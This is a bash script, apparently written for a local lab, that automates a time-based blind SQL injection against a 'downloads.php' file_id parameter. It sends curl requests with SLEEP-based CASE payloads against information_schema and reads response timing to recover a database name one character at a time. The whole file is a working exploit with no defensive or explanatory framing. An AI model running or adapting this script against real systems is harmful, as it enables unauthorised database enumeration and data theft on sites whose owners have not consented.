#! /usr/bin/bash

echo "Completely Blind Injection"

characters="abcdefghijklmnopqrstuvwxyz-_@%$#&ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered_char=''
pass=''
iterator=0
curr_char=''
payload=''

entrypass="12345678901234567890"

while [ $iterator -lt ${#characters}  ];
do
        curr_char=${characters:$iterator:1}
        payload=""$curr_char""
        if curl -i -s -k -w "@curl-format.txt" -X $'GET' \
    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    $'http://localhost/oat/downloads.php?file_id=101+AND+(SELECT+CASE+WHEN+EXISTS+(SELECT+1+FROM+information_schema.schemata+WHERE+schema_name+LIKE+"%'$payload'%")+THEN+(SELECT+SLEEP(0.5))+ELSE+0+END);' | grep -q "time_total:  1.";
        then
                echo "Char '"$curr_char"' exists.";
                filtered_char+=""$curr_char"";
        else
                echo "Char '"$curr_char"' doesn't exist.";
        fi
                ((iterator++));
done

echo "Filtered Chars =  "$filtered_char""
iterator=0

while [ ${#pass} -lt ${#entrypass} ];
do
        curr_char=${filtered_char:$iterator:1}
        payload=""$pass""$curr_char""
        echo "Trying "$payload""
        if curl -i -s -k -w "@curl-format.txt" -X $'GET' \
    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    $'http://localhost/oat/downloads.php?file_id=101+AND+(SELECT+CASE+WHEN+EXISTS+(SELECT+1+FROM+information_schema.schemata+WHERE+schema_name+LIKE+"'$payload'%")+THEN+(SELECT+SLEEP(0.5))+ELSE+0+END);' | grep -q "time_total:  1."
        then
                pass+=${curr_char}
                iterator=0
                echo "Current Password - "$pass""
        else
                ((++iterator))
        fi

        if [ ${#filtered_char} -lt $iterator ];
        then
                iterator=0
        fi
done


echo "Database is "$pass""
